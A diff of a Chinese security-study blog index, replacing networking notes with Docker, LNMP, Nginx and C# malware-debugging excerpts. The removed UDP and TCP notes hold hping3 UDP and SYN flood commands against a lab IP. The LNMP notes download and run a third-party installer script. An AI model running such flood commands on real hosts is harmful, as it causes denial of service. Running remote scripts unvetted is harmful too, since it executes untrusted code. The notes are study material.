@@ -184,7 +184,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/26/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DNS_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/07/13/Web%E6%B8%97%E9%80%8F/Docker%E7%8E%AF%E5%A2%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -198,7 +198,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/26/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DNS_new/" class="post-title-link" itemprop="url">DNS</a>
+            <a href="/2023/07/13/Web%E6%B8%97%E9%80%8F/Docker%E7%8E%AF%E5%A2%83/" class="post-title-link" itemprop="url">Docker环境安装</a>
         </h2>
 
         <div class="post-meta">
@@ -208,7 +208,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-26 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-26T00:00:00+08:00">2023-03-26</time>
+              <time title="创建时间：2023-07-13 00:00:00" itemprop="dateCreated datePublished" datetime="2023-07-13T00:00:00+08:00">2023-07-13</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -216,7 +216,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
                 </span>
             </span>
 
@@ -231,53 +231,22 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h3><p>1、概念</p>
+          <h4 id="1、Docker基本概念"><a href="#1、Docker基本概念" class="headerlink" title="1、Docker基本概念"></a>1、Docker基本概念</h4><p>一个非常轻量级的虚拟环境，没有独立IP，依赖于宿主机。 Docker之间可以互相通信。外部设备无法访问Docker，必须把端口映射给宿主机。</p>
+<p>注意事项：</p>
 <ul>
-<li>DNS记录<ul>
-<li>A   : 主机记录，域名和IP的映射</li>
-<li>CNAME ： 别名</li>
-<li>SOA：权威名称服务器</li>
-<li>NS：名称服务器</li>
-<li>MX：邮件交换记录</li>
-<li>SRV： 正在提供服务的</li>
-<li>PTR:  反向指针</li>
+<li>尽量让一个容器做一件事情</li>
+<li>尽量使用挂载的方式把数据文件挂载到容器中</li>
+<li>尽量不要使用交互环境来直接操作容器，而是在宿主机上执行命令。</li>
 </ul>
-</li>
-</ul>
-<p>2、DNS查询</p>
-<ul>
-<li><p>客户机访问<a target="_blank" rel="noopener" href="http://www.baidu.com,根据自己的tcp/IP%E5%8F%82%E6%95%B0%EF%BC%8C%E5%90%91%E8%87%AA%E5%B7%B1%E7%9A%84%E9%A6%96%E9%80%89DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81DNS%E8%AF%B7%E6%B1%82">www.baidu.com，根据自己的TCP/IP参数，向自己的首选DNS服务器发送DNS请求</a></p>
-</li>
-<li><p>首选DNS服务器收到客户机的请求后，去查询自己的区域文件，找不到IP地址信息（将请求转发给根域服务器）；直接可以找到，则返回IP地址</p>
-</li>
-<li><p>根域服务器收到请求后，由于根域服务器只维护顶级域服务器，会响应顶级域名服务器IP（com）,首选DNS根据根域名服务器响应的信息，将请求转发到com顶级域</p>
-</li>
-<li><p>com顶级域收到请求，由于com顶级域只维护二级域信息，会响应二级域服务器IP，首选DNS根据顶级域响应的信息，将请求转发到baidu.com 二级域</p>
-</li>
-<li><p>baidu.com 二级域收到请求，baidu.com DNS服务器里面维护的是baidu.com 区域内的所有主机信息，包含了<a target="_blank" rel="noopener" href="http://www.baidu.com的信息,将ip地址响应给首选dns/">www.baidu.com的信息，将IP地址响应给首选DNS</a></p>
-</li>
-<li><p>首选DNS响应给主机。</p>
-</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327213240915.png" alt="image-20230327213240915"></p>
-<p>3、 DNS配置 缓存DNS服务器 </p>
-<ul>
-<li><p>server2016上安装DNS服务，配置转发器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327223920382.png" alt="image-20230327223920382"></p>
-</li>
-<li><p>将另一台主机DNS服务器设置为server2016的IP，随后nslookup 查询特定域名</p>
-</li>
-<li><p>wireshark抓包</p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327224042516.png" alt="image-20230327224042516"></p>
-</li>
-<li><p>server2016这个缓存DNS服务器向转发器中的DNS服务器（192.168.10.1）转发DNS请求，192.168.10.1请求到以后，返回给server2016，server2016再响应client。</p>
-</li>
-</ul>
-<p>4、 DNS攻击</p>
-<p>环境：</p>
+<h4 id="2、Docker-环境安装"><a href="#2、Docker-环境安装" class="headerlink" title="2、Docker 环境安装"></a>2、Docker 环境安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install -y net-tools</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">yum-config-manager --add-rep http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">yum makecache fast</span><br><span class="line">yum install -y docker-ce</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、配置拉取的镜像源"><a href="#3、配置拉取的镜像源" class="headerlink" title="3、配置拉取的镜像源"></a>3、配置拉取的镜像源</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim/etc/docker/daemon.json </span><br><span class="line">添加</span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;:[</span><br><span class="line">     &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">     &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">     &quot;https://docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">     ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行docker info</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230711224747265.png" alt="image-20230711224747265"></p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/26/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DNS_new/#more" rel="contents">
+              <a class="btn" href="/2023/07/13/Web%E6%B8%97%E9%80%8F/Docker%E7%8E%AF%E5%A2%83/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -301,7 +270,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DHCP_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/07/12/%E9%80%86%E5%90%91/C#%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -315,7 +284,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DHCP_new/" class="post-title-link" itemprop="url">DHCP</a>
+            <a href="/2023/07/12/%E9%80%86%E5%90%91/C#%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">C# 恶意程序分析</a>
         </h2>
 
         <div class="post-meta">
@@ -325,7 +294,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-23 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-23T00:00:00+08:00">2023-03-23</time>
+              <time title="创建时间：2023-07-12 00:00:00" itemprop="dateCreated datePublished" datetime="2023-07-12T00:00:00+08:00">2023-07-12</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -333,7 +302,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
                 </span>
             </span>
 
@@ -348,47 +317,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h3><p>1、DHCP的工作原理</p>
-<ul>
-<li><p>动态主机配置协议，主要给客户机提供TCP&#x2F;IP参数（IP地址、子网掩码、网关、DNS）</p>
-</li>
-<li><p>好处</p>
-<ul>
-<li>减少管理员的工作量</li>
-<li>减少出错的可能，避免输入错误</li>
-<li>避免IIP冲突</li>
-<li>提高IP地址利用</li>
-</ul>
-</li>
-<li><p>应用层协议，基于UDP，端口号67，服务器响应给客户机的68号端口，客户机与服务器的交互过程</p>
-<ul>
-<li>dhcp discover  客户机 发送 ，以广播方式，网络中所有的DHCP服务器都会受到并响应 ，客户向受到的第一个offer报文的服务器发送request请求</li>
-<li>dhcp offer dhcp 服务器发送的提供报文</li>
-<li>dhcp request client 发送的request请求</li>
-<li>dhcp ack  服务器确认，客户机获得IP参数</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323204319729.png" alt="image-20230323204319729"></p>
-<p>除了以上的还有四种报文</p>
-<ul>
-<li>dhcp release</li>
-<li>dhcp nak: 针对request 的拒绝报文</li>
-<li>dhcp decline：当客户端发现接收到IP冲突时，发送此报文给服务器</li>
-<li>dhcp inform：已经有IP地址，获取其他的配置信息，如网关，DNS等</li>
-</ul>
-</li>
-</ul>
-<p>2、windows server 部署</p>
-<p>如图的拓扑结构，R1上需要在f0&#x2F;0接口配置dhcp中继，VM1才能请求到DHCPserver 分配的IP地址。 </p>
-<p>如图 DHCP server 配置了两个dhcp 作用域，50和120网段</p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323214149891.png" alt="image-20230323214149891"></p>
-<p>3、抓流量 </p>
-<ul>
-<li>示例1，释放vmnet1 的地址来抓包，查看这个过程</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /release  &quot;VMware Network Adapter VMnet1&quot;</span><br><span class="line">ipconfig /renew  &quot;VMware Network Adapter VMnet1&quot;</span><br></pre></td></tr></table></figure>
+          <p>一、C# 恶意程序分析</p>
+<p>主要用于调用Invoke函数加载解密后的PE的方法的调试。</p>
+<p>方法1：使用工具：Dnspy</p>
+<p>示例：</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202307121650714.png" alt="image-20230712164957387"></p>
+<p>定位Invoke函数，点击进入函数内部，不断F11进去</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202307121650549.png" alt="image-20230712165049508"></p>
+<p>UnsafeInvokeInternal函数F11进去</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202307121652024.png" alt="image-20230712165209965"></p>
+<p>RuntimeMethodHandle.InvokeMethod函数F11进去</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/DHCP_new/#more" rel="contents">
+              <a class="btn" href="/2023/07/12/%E9%80%86%E5%90%91/C#%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -412,7 +353,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/UDP_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/07/11/Web%E6%B8%97%E9%80%8F/LNMP%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -426,7 +367,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/UDP_new/" class="post-title-link" itemprop="url">UDP</a>
+            <a href="/2023/07/11/Web%E6%B8%97%E9%80%8F/LNMP%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">LNMP环境（支持LUA）</a>
         </h2>
 
         <div class="post-meta">
@@ -436,7 +377,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-23 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-23T00:00:00+08:00">2023-03-23</time>
+              <time title="创建时间：2023-07-11 00:00:00" itemprop="dateCreated datePublished" datetime="2023-07-11T00:00:00+08:00">2023-07-11</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -444,7 +385,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
                 </span>
             </span>
 
@@ -459,40 +400,34 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h3><ul>
-<li><p>特点</p>
-<p>不需要连接，直接发送数据，不会重新排序，也不需要确认</p>
-</li>
-<li><p>报文字段</p>
-<ul>
-<li>源端口</li>
-<li>目的端口</li>
-<li>length</li>
-<li>checksum</li>
-<li>stream index </li>
-<li>timestamps</li>
-<li>udp payload</li>
+          <h4 id="1、安装Mysql5-7"><a href="#1、安装Mysql5-7" class="headerlink" title="1、安装Mysql5.7"></a>1、安装Mysql5.7</h4><ul>
+<li>配置Mysql 的yum 源 CentOS 的yum源中没有mysql，需要到mysql的官网下载yum repo配置文件</li>
 </ul>
-</li>
-<li><p>常见UDP</p>
-<ul>
-<li>DNS 53</li>
-<li>ntp  123</li>
-<li>tftp 69</li>
-<li>rpc 111</li>
-<li>snmp 161</li>
-</ul>
-</li>
-<li><p>udp 攻击</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 <span class="literal">-q</span> <span class="literal">-n</span> <span class="literal">--rand-source</span> <span class="literal">--udp</span> <span class="literal">-p</span> <span class="number">53</span> <span class="literal">--flood</span> <span class="number">192.168</span>.<span class="number">198.135</span> <span class="literal">-d</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 下载安装</span><br><span class="line">wget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</span><br><span class="line">rpm -ivh mysql57-community-release-el7-11.noarch.rpm </span><br><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br><span class="line">yum -y install mysql-server</span><br><span class="line"></span><br><span class="line"># 查看mysqld 服务是否存在并启动</span><br><span class="line">systemctl start mysql</span><br><span class="line">systemctl status mysqld</span><br><span class="line"></span><br><span class="line"># 获取临时密码（mysql5.7才有，5.6默认密码为空）</span><br><span class="line">cat /var/log/mysqld.log |grep password</span><br><span class="line">2023-07-06T14:49:50.366809Z 1 [Note] A temporary password is generated for root@localhost: wF4t6oiiju)o</span><br><span class="line"># 更改密码</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Qwer1234@&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323202403665.png" alt="image-20230323202403665"></p>
+<ul>
+<li>查看默认密码策略</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230706225840203.png" alt="image-20230706225840203"></p>
+<p>如需关闭密码策略，在&#x2F;etc&#x2F;my.cnf 中添加</p>
+<p>validate_password&#x3D; off</p>
+<ul>
+<li><p>创建数据库和账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 创建数据库</span><br><span class="line">mysql&gt; create database web_site character set utf8 collate utf8_general_ci;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"># 创建用户</span><br><span class="line">mysql&gt; create user john@&#x27;%&#x27; identified by &#x27;Asdf1234@&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"># 授权用户用于该数据库的所有表的权限</span><br><span class="line">mysql&gt; grant all privileges on web_site.* to john@&#x27;%&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"># 查看用户是否添加成功</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select User,Host,authentication_string from user;</span><br><span class="line">+---------------+-----------+-------------------------------------------+</span><br><span class="line">| User          | Host      | authentication_string                     |</span><br><span class="line">+---------------+-----------+-------------------------------------------+</span><br><span class="line">| root          | localhost | *F393111FF4D128DBA783646EDBD577DC15DEBE40 |</span><br><span class="line">| mysql.session | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| mysql.sys     | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| john          | %         | *C244E5730489A669785440CA0861C36379D08029 |</span><br><span class="line">+---------------+-----------+-------------------------------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2、php7-3-源码安装"><a href="#2、php7-3-源码安装" class="headerlink" title="2、php7.3 源码安装"></a>2、php7.3 源码安装</h4><ul>
+<li><p>安装依赖库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel freetype-devel libxml2-devel libjpeg-devel libpng-devel curl-devel patch ncurses-devel bzip2 libcap-devel ntp diffutils sendmail iptables unzip cmake pcre-devel zlib-devel openssl openssl-devel libmcrypt-devel libmhash-devel sysklogd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">其中libmcrypt-devel libmhash-devel 安装失败</span></span><br><span class="line">解决办法</span><br><span class="line">1、安装第三方yum源</span><br><span class="line">wget http://www.atomicorp.com/installers/atomic</span><br><span class="line">sh ./atomic</span><br><span class="line">2、使用yum命令安装</span><br><span class="line">yum  install  libmcrypt-devel libmhash-devel</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sysklogd 安装失败，说是在较新的 Linux 发行版中，rsyslog 已经取代了 sysklogd，就没管了</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建用户和组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@192 ~]# groupadd www</span><br><span class="line">[root@192 ~]# useradd -r www -g www</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装</p>
 </li>
 </ul>
-
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/UDP_new/#more" rel="contents">
+              <a class="btn" href="/2023/07/11/Web%E6%B8%97%E9%80%8F/LNMP%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -516,7 +451,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/tcp_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/07/03/Web%E6%B8%97%E9%80%8F/Nginx_new/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -530,7 +465,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/tcp_new/" class="post-title-link" itemprop="url">tcp</a>
+            <a href="/2023/07/03/Web%E6%B8%97%E9%80%8F/Nginx_new/" class="post-title-link" itemprop="url">Nginx</a>
         </h2>
 
         <div class="post-meta">
@@ -540,7 +475,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-23 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-23T00:00:00+08:00">2023-03-23</time>
+              <time title="创建时间：2023-07-03 00:00:00" itemprop="dateCreated datePublished" datetime="2023-07-03T00:00:00+08:00">2023-07-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -548,7 +483,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
                 </span>
             </span>
 
@@ -563,53 +498,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><ul>
-<li>tcp字段</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323160711404.png" alt="image-20230323160711404"></p>
+          <h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p> 1、概念</p>
+<p>轻量应用服务器、高并发</p>
+<p>2、反向代理与正向代理</p>
+<p>正向代理示意图</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703214801703.png" alt="image-20230703214801703"></p>
+<p>作用：</p>
 <ul>
-<li><p>三次握手</p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323161445330.png" alt="image-20230323161445330"></p>
-<p>wireshark 抓包情况如下，第一次SYN&#x3D;1 seq&#x3D;391720034, 第二次SYN&#x3D;1 ACK&#x3D;1 seq &#x3D; 3010721076 ack&#x3D; 391720035, 第三次 ACK&#x3D;1, seq&#x3D;391720035 ack &#x3D; 3010721077, 第二次的seq是一个随机数，ack&#x3D;第一次seq+1, 第三次的seq&#x3D;第二次的ack，ack&#x3D; 第二次的seq+1</p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171451595.png" alt="image-20230323171451595"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171545209.png" alt="image-20230323171545209"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171639573.png" alt="image-20230323171639573"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171707687.png" alt="image-20230323171707687"></p>
-</li>
-<li><p>四次挥手</p>
-</li>
+<li>访问无法访问的资源如Google</li>
+<li>做缓存，加速访问资源，如CDN</li>
+<li>对客户端进行访问授权，上网认证</li>
+<li>记录用户访问记录，上网行为管理</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323163146327.png" alt="image-20230323163146327"></p>
-<ul>
-<li><p>tcp 半关闭状态</p>
-</li>
-<li><p>tcp半连接状态</p>
-<p>客户端syn，服务器syn, ack ,客户端不继续ack</p>
-<ul>
-<li><p>syn flood Ddos</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 <span class="literal">-c</span> <span class="number">1000</span> <span class="literal">-d</span> <span class="number">120</span> <span class="literal">-S</span> <span class="literal">-w</span> <span class="number">64</span> <span class="literal">-p</span> <span class="number">80</span> <span class="literal">--flood</span> <span class="literal">--rand-source</span> <span class="number">192.168</span>.<span class="number">198.135</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323194158066.png" alt="image-20230323194158066"></p>
-</li>
-</ul>
-</li>
-<li><p>ddos 防御</p>
-<ul>
-<li><p>tcp代理</p>
-</li>
-<li><p>tcp源探测</p>
-<p>回复伪造的syn+ack，然后如果client 发送RST，则说明是正常的包放行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323200541055.png" alt="image-20230323200541055"></p>
-</li>
-<li><p>TCP连接数量限制</p>
-</li>
-</ul>
-</li>
-</ul>
-
+<p>反向代理</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703215040740.png" alt="image-20230703215040740"></p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/tcp_new/#more" rel="contents">
+              <a class="btn" href="/2023/07/03/Web%E6%B8%97%E9%80%8F/Nginx_new/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -633,7 +538,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ICMP%E5%8D%8F%E8%AE%AE_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/06/27/Web%E6%B8%97%E9%80%8F/Java_Tomcat%E7%8E%AF%E5%A2%83_new/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -647,7 +552,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ICMP%E5%8D%8F%E8%AE%AE_new/" class="post-title-link" itemprop="url">ICMP协议</a>
+            <a href="/2023/06/27/Web%E6%B8%97%E9%80%8F/Java_Tomcat%E7%8E%AF%E5%A2%83_new/" class="post-title-link" itemprop="url">Java_Tomcat环境</a>
         </h2>
 
         <div class="post-meta">
@@ -657,7 +562,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-20 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-20T00:00:00+08:00">2023-03-20</time>
